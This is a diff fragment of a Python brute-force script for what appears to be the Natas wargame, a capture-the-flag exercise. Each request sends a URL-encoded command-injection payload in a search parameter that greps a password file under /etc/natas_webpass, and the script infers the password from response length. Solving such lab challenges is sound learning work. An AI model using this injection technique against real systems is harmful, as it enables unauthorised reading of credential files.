@@ -23,7 +23,7 @@ characters = list(string.ascii_letters+string.digits)
 
 for c in range(0,length): #loop for each character in the password
     for i in characters: #loop for each possible character as defined above (upper + lower + digits)
-        payload = '?needle=%24%7B%24%28grep+%5E{}{}+..%2F..%2F..%2F..%2Fetc%2Fnatas_webpass%2Fnatas17%29%3A0%3A1%7D&submit=Search'.format(position, i)
+        payload = '?needle=%24%7B%24%28grep+%5E{}{}+..%2F..%2F..%2F..%2Fetc%2Fnatas_webpass%2Fnatas17%29%3A{}%3A1%7D&submit=Search'.format(position, i, c)
         
         r = requests.get(url+payload, headers=headers)
         if len(r.text) > 1105:
